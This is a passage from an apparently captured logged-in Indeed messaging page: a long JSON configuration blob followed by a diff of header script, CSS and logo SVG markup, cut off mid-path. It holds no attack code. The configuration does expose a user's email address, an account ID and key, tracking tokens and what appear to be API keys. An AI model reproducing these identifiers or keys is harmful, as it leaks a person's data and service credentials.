https://apis.indeed.com/graphql","oneGraphApiKeyJobSeeker":"0749794b608bca655de91ae7abe1ef7ec2fb3717c107ccbe352b6f46d091ec28","inboxLogType":"gnavInbox","inboxLth":"12140b7982d032f1660f59e3e976c72d","promptInterestStrings":{"promptInterestModalTitleText":"Are you still interested in this job opportunity?","promptInterestModalReplyText":"Yes, reply now","promptInterestModalDismissText":"I'm no longer interested","defaultDeclineMessage":"Thanks for the opportunity, but I'm no longer interested at this time. I'll reach back out if things change.","promptSendDeclineMessageModalTitleText":"We'll send this message to the employer","promptSendDeclineMessageModalSendButtonText":"Send this decline message","promptSendDeclineMessageModalEditButtonText":"Edit message"},"userAgent":{"mobileDevice":false,"androidJobSearchApp":false,"tablet":false,"app":false,"android":false,"geolocationCapable":false,"userAgentString":"Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0","chromeForIOS":false,"safariForIOS":false,"ipadApp":false,"androidApp":false,"androidEmployerApp":false,"iosemployerApp":false,"googleWebLight":false,"fileUploadCapable":true,"jobSearchApp":false,"employerApp":false,"browser":"FIREFOX","dumbPhone":false,"browserVersion":{"version":"134.0","majorVersion":"134","minorVersion":"0"},"operatingSystem":"LINUX","os":{"version":"","majorVersion":-1,"minorVersion":-1,"patchVersion":-1,"releaseVersion":{"matchPrecision":"BUILD"},"family":"linux"},"deviceType":"COMPUTER","ios":false,"chrome":false,"safari":false,"ipadJobSearchApp":false,"ipad":false,"windowsPhone":false,"smartPhone":false,"phone":false,"bot":false,"browserFamily":"FIREFOX","iosjobSearchApp":false},"isJobseekerBrowserNewMessageTitleEnabled":false,"browserNewMessageTitleStrings":{"newMessageTitle":"New message | Indeed"},"isEmitBackgroundForegroundSignals":false,"backgroundSignalsDebounceParams":{"backgroundSignalDebounceSeconds":0,"foregroundSignalDebounceSeconds":0},"notificationApiHref":"https://ca.indeed.com/notifications/api/1/getNotificationsCount?client=gnav\u0026from=gnav-util-messaging--messaging-webapp\u0026gnavTK=1ijcmm45mgo9s801\u0026tk=1ijcmm45dkh7u8lk","notificationHref":"https://ca.indeed.com/notifications?from=gnav-util-messaging--messaging-webapp\u0026gnavTK=1ijcmm45mgo9s801\u0026tk=1ijcmm45dkh7u8lk\u0026hl=en","isShowNotificationIcon":true,"notificationLogType":"gnavNotification","notificationLth":"6d669dfa33371660f3e683b38b9f3ddc","myjobsApiHref":"","myjobsHref":"https://myjobs.indeed.com?from=gnav-util-messaging--messaging-webapp\u0026gnavTK=1ijcmm45mgo9s801\u0026tk=1ijcmm45dkh7u8lk\u0026co=CA\u0026hl=en","myjobsLogTuple":"gnavMyjobs:5d9eaad2bbc69a980218f0a8aa03ae77","isMyjobsTestActive":false,"isShowMyjobsIcon":false,"myjobsTestBucket":-1,"saveIconType":"bookmark","myjobsLogType":"gnavMyjobs","myjobsLth":"5d9eaad2bbc69a980218f0a8aa03ae77","openAppButtonText":"Open app","openAppButtonHref":"https://indeed.onelink.me/oo1Z?af_xp=custom\u0026pid=indeed_web\u0026c=gnav-open-app\u0026af_adset=magua_gnav_app_download_tst-1\u0026indeed_sub2=1ihuecnt7kupu801\u0026targetUrl=https%3A%2F%2Fmessages.indeed.com%2Fconversations%2F%3Ffrom%3Dgnav-util-messaging--messaging-webapp%26gnavTK%3D1ijclnhngg7pe800%26tk%3D1ijclnhn7l807ccp%26co%3DCA%26hl%3Den%26filter%3DInbox%26utm_source%3Dgnav-open-app%26utm_medium%3Dindeed_web%26utm_campaign%3Dmagua_gnav_app_download_tst-1%252Cutmend%252CsgndIn%253D1\u0026af_sub1=1\u0026utm_source=gnav-open-app\u0026utm_medium=indeed_web\u0026utm_campaign=magua_gnav_app_download_tst-1%2Cutmend%2CsgndIn%3D1","renderOpenAppBtn":false,"openAppButtonVariant":"rounded","openAppButtonFontSize":"16px","openAppButtonBorderRadius":"100px","openAppButtonLineHeight":1.5,"MinimizeHpSearchTestValue":-1,"searchHref":"https://ca.indeed.com/jobs?isSearchStartPage=1","accountMenuLinks":[{"text":"Profile","key":"resume","href":"https://my.indeed.com/resume?hl=en_CA\u0026co=CA\u0026from=gnav-messaging--messaging-webapp","dataGnavElementName":"MyIndeedResume"},{"text":"Resume services","key":"careerServices","href":"https://www.indeed.com/career-services/resume-help?collectorID=gnav\u0026hl=en\u0026co=CA\u0026from=gnav-messaging--messaging-webapp","dataGnavElementName":"CareerServices"},{"text":"My jobs","key":"jobActivity","href":"https://myjobs.indeed.com?hl=en\u0026co=CA\u0026from=gnav-messaging--messaging-webapp","dataGnavElementName":"MyJobs"},{"text":"My reviews","key":"contributions","href":"https://ca.indeed.com/contributions?from=gnav-messaging--messaging-webapp","dataGnavElementName":"MyContributions"},{"text":"Settings","key":"account","href":"https://secure.indeed.com/settings?hl=en_CA\u0026co=CA\u0026continue=https%3A%2F%2Fmessages.indeed.com%2Fconversations%2F%3Ffrom%3Dgnav-util-messaging--messaging-webapp%26gnavTK%3D1ijclnhngg7pe800%26tk%3D1ijclnhn7l807ccp%26co%3DCA%26hl%3Den%26filter%3DInbox\u0026tmpl=desktop\u0026from=gnav-util-messaging--messaging-webapp","dataGnavElementName":"AccountSettings"},{"text":"Help","key":"helpCenter","href":"https://ca.indeed.com/help/","dataGnavElementName":"HelpCenter"},{"text":"Privacy Centre","key":"privacyCenter","href":"https://hrtechprivacy.com/","dataGnavElementName":"PrivacyCenter"}],"signOutLink":{"text":"Sign out","href":"https://secure.indeed.com/account/logout?hl=en_CA\u0026co=CA\u0026continue=https%3A%2F%2Fmessages.indeed.com%2Fconversations%2F%3Ffrom%3Dgnav-util-messaging--messaging-webapp%26gnavTK%3D1ijclnhngg7pe800%26tk%3D1ijclnhn7l807ccp%26co%3DCA%26hl%3Den%26filter%3DInbox\u0026tmpl=desktop\u0026from=gnav-util-messaging--messaging-webapp","dataGnavElementName":"SignOut"},"loggedIn":true,"userEmail":"donald-robert@outlook.com","signalsLogRoute":"https://t.indeed.com/signals/v1/log?from=messaging--messaging-webapp-messaging\u0026parentLogId=1ijcmm45mgo9s801\u0026hostAppTk=1ijcmm45dkh7u8lk","serviceRequestLogUID":"1ijcmm45mgo9s801","hostAppTk":"1ijcmm45dkh7u8lk","pageId":"messaging","canonicalPageId":"","applicationId":"messaging--messaging-webapp","requestURL":"https://messages.indeed.com/conversations/?from=gnav-util-messaging--messaging-webapp\u0026gnavTK=1ijclnhngg7pe800\u0026tk=1ijclnhn7l807ccp\u0026co=CA\u0026hl=en\u0026filter=Inbox","language":"en","jsErrorLogType":"gnavJSError","jsErrorLth":"6411ec182c6acd8714dc2d03716eed1d","jsEnabledLogType":"gnavJSEnabled","jsEnabledLth":"5e9311c1001227ca5c6c32db123fb854","interactionLogType":"gnavInteraction","interactionLth":"87caa20c31fa9e447264b1615339f1ce","clickLogType":"gnavClick","clickLth":"fa8b0aff9499e52dd7e9215032d9ad9f","pageSpeedLogType":"gnavPageSpeed","pageSpeedLth":"12783140239867f5afc3bd80a743e013","dwellTimeLogType":"gnavDwellTime","dwellTimeLth":"e415e44ee819f056fc4675c1b0373740","clickstreamEnabled":false,"pagenavigationEnabled":true,"clickstreamEnvironmentId":"","signalsTransportImplementation":"nativeBeacon","isShowLanguageSwitcher":true,"iconLabels":{"Primary":"Primary","Messages":"Messages","Notifications":"Notifications","Account":"Account","Navigation":"Navigation","Close":"Close","Indeed Home":"Indeed Home","Indeed Home - For employers":"Indeed Home - For employers","Featured Employer":"Featured Employer","Unread count":"Unread count","Expand":"Expand","Collapse":"Collapse","Create new":"Create new","Expand create new menu":"Expand create new menu","Primary navigation":"Primary navigation","Resources":"Resources","Switch employer account":"Switch employer account","Side navigation":"Side navigation","Get started":"Get started","My jobs":"My jobs","Main menu":"Main menu","Search":"Search"},"webVitalsEnabled":true,"resourceTimingEnabled":false,"isPreproduction":false,"stagingLevel":"prod","overrideJSContinueUrl":"https://onboarding.indeed.com/onboarding?hl=en_CA\u0026co=CA\u0026from=","menuLinks":{"top":[{"primaryText":"Home","link":"https://ca.indeed.com/m/","data-gnav-element-name":"JobSearch","data-gnav-action":"nav","dataHref":"https://ca.indeed.com/m/?from=gnav-menu-messaging--messaging-webapp"},{"primaryText":"Company reviews","link":"https://ca.indeed.com/companies","data-gnav-element-name":"CompanyReviews","data-gnav-action":"nav","dataHref":"https://ca.indeed.com/companies?from=gnav-menu-messaging--messaging-webapp"},{"primaryText":"Salary guide","link":"https://ca.indeed.com/career/salaries","data-gnav-element-name":"FindSalaries","data-gnav-action":"nav","dataHref":"https://ca.indeed.com/career/salaries?from=gnav-menu-messaging--messaging-webapp"},{"primaryText":"Employers","link":"https://employers.indeed.com/p/posting","data-gnav-element-name":"Employers","data-gnav-action":"nav","dataHref":"https://employers.indeed.com/p/posting?hl=en_CA\u0026co=CA\u0026from=gnav-menu-messaging--messaging-webapp\u0026ikw=gnav-menu-hire\u0026isid=employerlink-CA"}],"bottom":[{"primaryText":"Profile","link":"https://my.indeed.com/resume?hl=en_CA\u0026co=CA","data-gnav-element-name":"Resume","data-gnav-action":"nav","dataHref":"https://my.indeed.com/resume?hl=en_CA\u0026co=CA\u0026from=gnav-menu-messaging--messaging-webapp"},{"primaryText":"Resume help","link":"https://www.indeed.com/career-services/resume-help?collectorID=gnav\u0026hl=en\u0026co=CA","data-gnav-element-name":"CareerServices","data-gnav-action":"nav"},{"primaryText":"My jobs","link":"https://myjobs.indeed.com?hl=en\u0026co=CA","data-gnav-element-name":"MyJobs","data-gnav-action":"nav","dataHref":"https://myjobs.indeed.com?hl=en\u0026co=CA\u0026from=gnav-menu-messaging--messaging-webapp"},{"primaryText":"My reviews","link":"https://ca.indeed.com/contributions","data-gnav-element-name":"MyContributions","data-gnav-action":"nav","dataHref":"https://ca.indeed.com/contributions?from=gnav-menu-messaging--messaging-webapp"},{"primaryText":"Settings","link":"https://secure.indeed.com/settings?hl=en_CA\u0026co=CA\u0026continue=https%3A%2F%2Fmessages.indeed.com%2Fconversations%2F%3Ffrom%3Dgnav-util-messaging--messaging-webapp%26gnavTK%3D1ijclnhngg7pe800%26tk%3D1ijclnhn7l807ccp%26co%3DCA%26hl%3Den%26filter%3DInbox\u0026tmpl=desktop\u0026from=gnav-util-messaging--messaging-webapp","data-gnav-element-name":"Account","data-gnav-action":"nav"},{"primaryText":"Change country","link":"https://ca.indeed.com/m/countries","data-gnav-element-name":"ChangeCountries","data-gnav-action":"nav","dataHref":"https://ca.indeed.com/m/countries?from=gnav-menu-messaging--messaging-webapp","subText":"Canada"},{"primaryText":"Help","link":"https://ca.indeed.com/help/","data-gnav-element-name":"JobseekerHelpCenter","data-gnav-action":"nav"},{"primaryText":"Privacy Centre","link":"https://hrtechprivacy.com/","data-gnav-element-name":"PrivacyCenter","data-gnav-action":"nav","dataHref":"https://hrtechprivacy.com/?from=gnav-menu-messaging--messaging-webapp"},{"primaryText":"Sign out","link":"https://secure.indeed.com/account/logout?hl=en_CA\u0026co=CA\u0026continue=https%3A%2F%2Fmessages.indeed.com%2Fconversations%2F%3Ffrom%3Dgnav-util-messaging--messaging-webapp%26gnavTK%3D1ijclnhngg7pe800%26tk%3D1ijclnhn7l807ccp%26co%3DCA%26hl%3Den%26filter%3DInbox\u0026tmpl=desktop\u0026from=gnav-util-messaging--messaging-webapp","data-gnav-element-name":"SignOut","data-gnav-action":"nav","dataHref":"https://secure.indeed.com/account/logout?hl=en_CA\u0026co=CA\u0026continue=https%3A%2F%2Fmessages.indeed.com%2Fconversations%2F%3Ffrom%3Dgnav-util-messaging--messaging-webapp%26gnavTK%3D1ijclnhngg7pe800%26tk%3D1ijclnhn7l807ccp%26co%3DCA%26hl%3Den%26filter%3DInbox\u0026tmpl=desktop\u0026from=gnav-util-messaging--messaging-webapp","subText":"donald-robert@outlook.com"}]},"showHeaderImpressum":true,"linksMap":{"AccessibilityAtIndeed":{"description":"Accessibility at Indeed","href":"https://ca.indeed.com/accessibility?hl=en","dataHref":"https://ca.indeed.com/accessibility?hl=en\u0026from=gnav-messaging--messaging-webapp","dataGnavElementName":"AccessibilityAtIndeed"},"Terms":{"description":"Terms","href":"https://ca.indeed.com/legal?hl=en","dataHref":"https://ca.indeed.com/legal?hl=en\u0026from=gnav-messaging--messaging-webapp","dataGnavElementName":"Terms"},"Security":{"description":"Security","href":"https://ca.indeed.com/security","dataHref":"https://ca.indeed.com/security?from=gnav-messaging--messaging-webapp","dataGnavElementName":"Security"},"Contact":{"description":"Contact us","href":"https://ca.indeed.com/support","dataHref":"https://ca.indeed.com/support?from=gnav-messaging--messaging-webapp","dataGnavElementName":"Contact"}},"year":2025,"adblockDetectionBannerText":"If you notice issues with your Indeed pages, please turn off your ad blocker.","showAdblockDetectionBanner":false,"adblockDetectionBannerTitle":"Ad blocker detected","adblockDetectionBannerDismissText":"Dismiss","googleAnalyticsEnabled":false,"useNewGAScript":false,"isMandatoryLanguageSelectorEnabled":false,"languageSelectorDismissLabel":"close","mandatoryLanguageSelectorCalloutContent":{"title":"Your default language is set to English","body":"You can change your language here"},"isPhoneUpdateNudgeEnabled":false,"lastFetchedActiveTimeCookieDomain":".indeed.com","phoneUpdateNudgeRedirectionUrl":"https://secure.indeed.com/account/changephone?src=gnav\u0026continue=https://messages.indeed.com/conversations/?from=gnav-util-messaging--messaging-webapp\u0026gnavTK=1ijclnhngg7pe800\u0026tk=1ijclnhn7l807ccp\u0026co=CA\u0026hl=en\u0026filter=Inbox","lastFetchedActiveTime":"undefined","accountId":"1157150862","ctk":"1ihuecnt7kupu801","isPnoUser":false,"proctorWindowSize":0,"phoneUpdateNudgeDataGnavRegion":"PhoneUpdateNudge","phoneUpdateNudgeHeaderText":"Review phone number","phoneUpdateNudgeBodyText":"Is [donald-robert@outlook.com|strong] your current phone number eligble to receive both WhatsApp and SMS messages? An updated phone number ensures that you don’t lose access to your Indeed account.","phoneUpdateNudgePrimaryCtaText":"Yes, this is correct","phoneUpdateNudgeSecondaryCtaText":"Update phone number","isRealTimeMessaging":true,"isSharedRealtimeConnection":true,"isJobseekerImsReadDataEnabled":true,"isJobseekerUnreadConversationCountEnabled":true,"showUnreadMessageDrawerBucket":-1,"proctorGroups":["#A2:bot_detection_fingerprinting_indeedmobile-1","#A4:bot_detection_fingerprinting1","#A1:ecp_emit_background_tabs_signal_tst-1","#A5:ecp_no_nav_background_connection_tog1","#A3:ecp_sse_connection_sharing_tog1","#A1:empon_header_paj_orchestrator_redirect_tst-1","globalfeatures_client_navigation-1","#A1:gnav_account_menu_switch_account_modal_tst-1","#A5:gnav_adblock_detection_banner_tog-1","#A4:gnav_clickstream_tog-1","#C18:gnav_ddrum_tog-1","gnav_dsa_non_personalized_tst-1","#B2:gnav_empcenter_responsive_nav_tst1","gnav_employer_header_continue_orchestrator_tst-1","gnav_employer_header_labels-1","gnav_employer_hiring_test-1","gnav_first_party_cookie_deletion_tog-1","gnav_global_privacy_control_flag_banner_tog-1","#A7:gnav_google_only_modal_tst1","#A20:gnav_googleanalytics_tst1","#A1:gnav_js_adtransparency_tst-1","#B4:gnav_js_privacylinkoptimization_tst1","#A5:gnav_jsgrowth_act_autologin_tog2","#B2:gnav_loggedin_jobseeker_homepage_remove_footers_tst1","gnav_mega_menu_employer_header_tst-1","#A3:gnav_minimal_passport_footer_tst1","gnav_onetrust_tst-1","#A12:gnav_onetrust_version_tog1","#A8:gnav_pagenav_log_emit_tog1","#A4:gnav_resource_timing_tog-1","#E17:gnav_seasonal_logo_tst0","#H3:gnav_seasonal_secondary_logo_tst-1","#D2:gnav_switch_account_modal_tst1","gnav_verification_banner_employer_home_smb_tog-1","gnav_verification_banner_employer_home_tog-1","gnav_verification_banner_employer_smb_tog-1","#A1:gnavtrace-1","ibu_india_mandatory_language_selector_tst-1","ibu_india_resume_discovery_users_tst-1","jpe_onboarding_tst-1","js_browser_new_message_notification_tab-1","#H3:jsj_hp_footer_tst1","#C4:jsj_hp_saveicon_tst1","jsj_show_unread_message_drawer_tst-1","#B1:jso_job_calibration_tst-1","#D5:jso_minimal_onboarding_tst2","magua_gnav_app_download_tst-1","#A5:mmblue_gnav_unread_conversation_count_tst1","#A20:msgd_real_time_new_msg_tst1","#A19:msgw_ims_readdata_migration_tst1","#A3:passux_modal_view1","pet_cpra_donotsellsharelink_tst-1","phone_update_nudge_pno_tst-1","smb_left_nav_modal_tour-1","#A13:traffic_gnav_employer_link-1","#A3:gnav_frontendsentryacme__acme_webapptog-1","#A2:gnav_frontendsentrydradis__cerberustog-1","#A2:gnav_frontendsentryhiring_events__hiring_events_management_webapptog1","#A2:gnav_frontendsentryrezemp__zurgtog1","#A2:gnav_frontendsentryhiring_events__hiring_events_management_api_javatog1","#A1:gnav_frontendsentrylabs__conductortog-1","#A2:gnav_frontendsentryjobseeker_profile__profile_one_frontendtog1","#A1:gnav_frontendsentrylabs__asyncvideointerviewsapiapptog-1","#A5:gnav_frontendsentrycmi__directapplytog-1","#A6:gnav_frontendsentryjobsearch__indeedmobiletog1","#A5:gnav_frontendsentrydefaulttog-1","#A3:gnav_frontendsentrysalary__salarycalculatorfrontendtog1","#A4:gnav_frontendsentryindapply_SmartApplytog1","#A2:gnav_frontendsentrydradis__hadestog-1","#A2:gnav_frontendsentryelephant_jobi2a__i2a_webapptog1","#A2:gnav_frontendsentryhomepage__homepage_webapptog1","#A3:gnav_frontendsentryapplymgt__app_tracker_webapptog1","#A2:gnav_frontendsentrysocial_impact__social_impact_partners_webapp1","#A1:gnav_frontendsentryinterview_rsvp_webapptog-1","#A2:gnav_frontendsentrylabs__sales_talktog-1","#A3:gnav_frontendsentrymessaging__messaging_webapptog1","privileged1"],"accountKey":"9f7a676d5337351531b994971fbff6de","oneGraphApiKey":"8a0b9a0515af41addb33361deed717802de3577937ca4b28d5cbdaf56d947dc9","fingerprintEnabled":true,"fingerprintProctors":{"indeedMobile":false,"acme":true},"hideResumeLink":true,"nonPersonalizedExperienceTestActive":false,"reactTestEnabled":true,"enableFirstPartyCookieDeletion":false,"cookiesToBeDeleted":[],"publicPath":"https://c03.s3.indeed.com/dist/"}</script>
         <script>
-          if (
-            window.performance !== undefined &&
-            performance.mark !== undefined
-          ) {
-            performance.mark("gnavRenderBlockingCSSHeader:start")
-          }
-        </script>
-        <link
-          rel="stylesheet"
-          type="text/css"
-          href="https://c03.s3.indeed.com/dist/header/noNavHeader.87437949222d8e81bf7e.css"
-          crossorigin="anonymous"
-        />
-        <link
-          rel="preconnect"
-          href="https://fonts.gstatic.com/"
-          crossorigin="anonymous"
-        />
-        <link
-          rel="stylesheet"
-          type="text/css"
-          href="https://c03.s3.indeed.com/fonts/v1/indeedsans.css"
-          crossorigin="anonymous"
-        />
+            if (window.performance !== undefined && performance.mark !== undefined) {
+                performance.mark('gnavRenderBlockingCSSHeader:start');
+            }
+        </script><link rel="stylesheet" type="text/css" href="https://c03.s3.indeed.com/dist/header/jobseekerHeader.3e42f98992c00d70bb5a.css" crossorigin="anonymous">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="anonymous" />
+        <link rel="stylesheet" type="text/css" href="https://c03.s3.indeed.com/fonts/v1/indeedsans.css" crossorigin="anonymous" />
         <script>
-          if (
-            window.performance !== undefined &&
-            performance.mark !== undefined &&
-            performance.measure !== undefined
-          ) {
-            performance.mark("gnavRenderBlockingCSSHeader:end")
-            performance.measure(
-              "gnavRenderBlockingCSSHeader",
-              "gnavRenderBlockingCSSHeader:start",
-              "gnavRenderBlockingCSSHeader:end",
-            )
-          }
-        </script>
-        <nav class="gnav" id="gnav-main-container" aria-label="Primary"></nav>
+            if (window.performance !== undefined && performance.mark !== undefined && performance.measure !== undefined) {
+                performance.mark('gnavRenderBlockingCSSHeader:end');
+                performance.measure('gnavRenderBlockingCSSHeader', 'gnavRenderBlockingCSSHeader:start', 'gnavRenderBlockingCSSHeader:end');
+            }
+        </script><nav class="gnav" id="gnav-main-container" aria-label="Primary"><style>.jobsearch-ResumeFooter-container, .jobsearch-FooterResume { display: none; }</style><div data-gnav-region="Main"><style data-emotion="gnav-header dl7bvl">#gnav-main-container.gnav .gnav-header-dl7bvl{display:flex;box-sizing:border-box;margin-block-start:0;margin-block-end:0;margin-inline-start:0;margin-inline-end:0;min-inline-size:0;width:100%;min-height:3.25rem;background-color:#ffffff;justify-content:space-between;border-bottom-width:0.0625rem;border-bottom-color:#e4e2e0;border-bottom-style:none;}@media screen and (min-width: 62em){#gnav-main-container.gnav .gnav-header-dl7bvl{border-bottom-style:solid;}}</style><div class="gnav-header-dl7bvl e37uo190"><div class="css-sgpak9 e37uo190"><style data-emotion="gnav-header 1yj7ljr">#gnav-main-container.gnav .gnav-header-1yj7ljr{font-family:"Indeed Sans","Noto Sans","Helvetica Neue","Helvetica","Arial","Liberation Sans","Roboto","Noto",sans-serif;border-bottom:0.0625rem solid;text-decoration:none;cursor:pointer;color:#2557a7;transition:border-color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),background-color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),opacity 200ms cubic-bezier(0.645, 0.045, 0.355, 1),border-bottom-color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),border-bottom-style 200ms cubic-bezier(0.645, 0.045, 0.355, 1),border-bottom-width 200ms cubic-bezier(0.645, 0.045, 0.355, 1),border-radius 200ms cubic-bezier(0.645, 0.045, 0.355, 1),box-shadow 200ms cubic-bezier(0.645, 0.045, 0.355, 1),color 200ms cubic-bezier(0.645, 0.045, 0.355, 1);color:#2d2d2d;display:inline-flex;align-items:center;height:3rem;margin:0.125rem 0.75rem 0.125rem 1rem;border-bottom:none;}#gnav-main-container.gnav .gnav-header-1yj7ljr:visited{color:#2557a7;}#gnav-main-container.gnav .gnav-header-1yj7ljr:hover{color:#164081;}#gnav-main-container.gnav .gnav-header-1yj7ljr:active{color:#0d2d5e;}#gnav-main-container.gnav .gnav-header-1yj7ljr:focus{outline:none;box-shadow:0 0 0 0.125rem rgb(255,255,255),0 0 0 0.1875rem rgb(37,87,167);}@media (prefers-reduced-motion: reduce){#gnav-main-container.gnav .gnav-header-1yj7ljr{transition:none;}}#gnav-main-container.gnav .gnav-header-1yj7ljr:focus:active:not([data-focus-visible-added]),#gnav-main-container.gnav .gnav-header-1yj7ljr:focus:not([data-focus-visible-added]){box-shadow:none;border-bottom:0.0625rem solid;}#gnav-main-container.gnav .gnav-header-1yj7ljr:hover{color:#2d2d2d;}@media screen and (min-width: 62em){#gnav-main-container.gnav .gnav-header-1yj7ljr{height:1.75rem;margin:0.125rem;padding-left:1.375rem;padding-right:1.375rem;padding-top:1.25rem;padding-bottom:1.25rem;width:7rem;}}#gnav-main-container.gnav #gnav-main-container.gnav .gnav-header-1yj7ljr:focus,#gnav-main-container.gnav #gnav-main-container.gnav .gnav-header-1yj7ljr:focus:not([data-focus-visible-added]){border-bottom:none;}</style><a class="gnav-Logo gnav-header-1yj7ljr e19afand0" href="https://ca.indeed.com?from=gnav-messaging--messaging-webapp" data-gnav-element-name="Logo" id="indeed-globalnav-logo" aria-label="Indeed Home"><div class="gnav-Logo-icon" aria-hidden="true"><svg width="75" height="20" viewBox="0 0 75 20" fill="none" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M74.613 3.458c-.265-.297-.62-.448-1.1-.448-.48 0-.846.159-1.101.487-.255.317-.387.793-.387 1.417v4.524c-.59-.636-1.203-1.092-1.825-1.399a4.568 4.568 0 0 0-1.356-.397 6.917 6.917 0 0 0-.937-.06c-1.559 0-2.822.536-3.791 1.608-.958 1.072-1.438 2.56-1.438 4.472 0 .904.123 1.747.367 2.52.246.772.59 1.448 1.06 2.022a4.975 4.975 0 0 0 1.67 1.33 4.766 4.766 0 0 0 2.089.465c.345 0 .672-.029.977-.088.205-.03.397-.08.592-.14a5.086 5.086 0 0 0 1.335-.674 7.8 7.8 0 0 0 1.253-1.15v.297c0 .565.143.992.418 1.3.286.297.643.455 1.07.455.438 0 .794-.149 1.07-.435.273-.298.417-.734.417-1.318V4.758c.004-.567-.128-1.004-.383-1.3zm-3.169 12.477c-.275.575-.643 1.002-1.09 1.28-.46.279-.96.416-1.51.416h-.01a2.79 2.79 0 0 1-1.509-.435c-.459-.298-.825-.734-1.089-1.309-.264-.585-.396-1.29-.396-2.123 0-.784.121-1.477.377-2.062.245-.596.601-1.052 1.05-1.368.46-.328.97-.477 1.548-.477h.03c.541 0 1.04.158 1.499.465.459.308.825.756 1.1 1.34.275.585.408 1.29.408 2.102 0 .872-.133 1.597-.408 2.171zm-9.896.13c-.194-.168-.459-.258-.785-.258-.296 0-.52.07-.683.199-.398.356-.713.644-.96.852-.242.199-.52.397-.813.584a3.27 3.27 0 0 1-.896.399 3.798 3.798 0 0 1-1.03.128c-.081 0-.163 0-.235-.01a2.829 2.829 0 0 1-1.303-.397c-.47-.267-.836-.662-1.122-1.179-.275-.536-.418-1.15-.427-1.845h6.145c.825 0 1.466-.12 1.915-.337.46-.239.683-.735.683-1.498 0-.833-.224-1.646-.662-2.45-.438-.795-1.09-1.449-1.976-1.953-.878-.506-1.927-.754-3.16-.754h-.091c-.907.01-1.743.16-2.486.437a5.54 5.54 0 0 0-1.969 1.269 5.677 5.677 0 0 0-1.2 1.994 7.49 7.49 0 0 0-.42 2.518c0 1.925.562 3.432 1.682 4.552 1.06 1.062 2.527 1.618 4.391 1.677.103.01.213.01.327.01.876 0 1.66-.11 2.342-.337.683-.228 1.244-.507 1.694-.843.446-.347.783-.704 1.007-1.07.224-.367.337-.695.337-.963 0-.31-.1-.557-.305-.725zm-7.336-5.605c.5-.526 1.141-.784 1.926-.784h.012c.814 0 1.477.258 1.976.773.5.517.795 1.3.867 2.35h-5.698c.101-1.03.408-1.814.917-2.339zm-6.045 5.346c-.305 0-.529.07-.692.198-.387.357-.713.645-.958.853-.245.198-.51.397-.806.584-.294.179-.591.318-.906.398a3.742 3.742 0 0 1-1.03.128c-.08 0-.162 0-.234-.01a2.841 2.841 0 0 1-1.304-.396 2.932 2.932 0 0 1-1.11-1.18c-.286-.535-.429-1.15-.44-1.844h6.155c.815 0 1.456-.12 1.915-.338.448-.238.674-.734.674-1.497 0-.834-.215-1.647-.653-2.45-.438-.795-1.1-1.45-1.976-1.954-.878-.505-1.937-.753-3.158-.753h-.103c-.906.01-1.731.16-2.486.437a5.383 5.383 0 0 0-1.957 1.268 5.54 5.54 0 0 0-1.212 1.994 7.451 7.451 0 0 0-.42 2.518c0 1.925.572 3.432 1.692 4.552 1.06 1.063 2.517 1.618 4.382 1.677.112.01.212.01.326.01.886 0 1.661-.109 2.343-.336.682-.229 1.244-.507 1.691-.843.46-.348.785-.704 1.01-1.07.223-.367.337-.695.337-.964 0-.307-.103-.555-.296-.723-.202-.17-.469-.26-.784-.26zm-6.562-5.346c.499-.526 1.142-.784 1.927-.784h.011c.814 0 1.477.258 1.976.773.509.517.795 1.3.877 2.35h-5.707c.112-1.03.419-1.814.916-2.339zM6.547 17.969v-7.301c.212.02.417.029.631.029a5.514 5.514 0 0 0 2.792-.744v8.014c0 .685-.163 1.19-.48 1.528-.315.336-.733.504-1.242.504-.5 0-.897-.168-1.223-.515-.315-.336-.478-.842-.478-1.515zm29.6-14.51c-.265-.298-.631-.449-1.09-.449-.48 0-.846.159-1.102.487-.264.317-.387.793-.387 1.417v4.524c-.59-.636-1.2-1.092-1.824-1.399a4.644 4.644 0 0 0-1.354-.397 6.901 6.901 0 0 0-.938-.06c-1.559 0-2.833.536-3.79 1.608-.959 1.072-1.438 2.56-1.438 4.472 0 .904.123 1.747.356 2.52a6.03 6.03 0 0 0 1.072 2.022 4.96 4.96 0 0 0 1.67 1.33 4.766 4.766 0 0 0 2.089.465c.336 0 .662-.029.977-.088.205-.03.398-.08.592-.14a5.086 5.086 0 0 0 1.335-.674c.417-.298.827-.685 1.252-1.15v.297c0 .565.144.992.419 1.3.275.297.643.455 1.07.455.417 0 .785-.149 1.06-.435.275-.298.406-.734.406-1.318V4.758c.001-.567-.12-1.004-.374-1.3zm-3.16 12.476c-.274.575-.642 1.002-1.1 1.28-.448.279-.959.416-1.497.416h-.01c-.55 0-1.05-.149-1.508-.435-.468-.298-.825-.734-1.09-1.309-.264-.585-.397-1.29-.397-2.123 0-.784.123-1.477.366-2.062.254-.596.601-1.052 1.06-1.368.448-.328.968-.477 1.539-.477h.04c.54 0 1.039.158 1.488.465.469.308.835.756 1.11 1.34.264.585.408 1.29.408 2.102 0 .872-.144 1.597-.408 2.171zM14.995 9.25v.378c.56-.715 1.161-1.23 1.814-1.568.662-.326 1.416-.496 2.272-.496.826 0 1.57.18 2.22.526a3.35 3.35 0 0 1 1.457 1.488c.215.376.348.784.408 1.221.061.426.091.981.091 1.656v5.685c0 .614-.153 1.08-.438 1.387-.284.317-.662.475-1.12.475-.47 0-.846-.158-1.142-.484-.296-.319-.439-.783-.439-1.378v-5.093c0-1.011-.143-1.784-.428-2.32-.285-.534-.867-.803-1.72-.803-.562 0-1.07.168-1.53.486a2.826 2.826 0 0 0-1.018 1.35c-.153.455-.224 1.298-.224 2.56v3.818c0 .624-.152 1.08-.447 1.399-.296.307-.672.465-1.142.465-.459 0-.827-.158-1.121-.484-.296-.319-.438-.783-.438-1.378V9.3c0-.584.133-1.02.398-1.3.254-.286.61-.436 1.07-.436.275 0 .52.06.743.189.224.128.406.317.54.574.132.258.194.567.194.923zM6.566.473c2.12-.744 4.535-.704 6.348.822.337.307.723.695.876 1.15.184.577-.641-.06-.754-.139-.592-.377-1.182-.694-1.844-.912-3.566-1.07-6.94.864-9.038 3.87C1.278 6.59.707 7.99.24 9.526c-.052.168-.092.387-.184.535-.093.17-.04-.455-.04-.476.07-.635.203-1.25.368-1.864.967-3.273 3.106-6 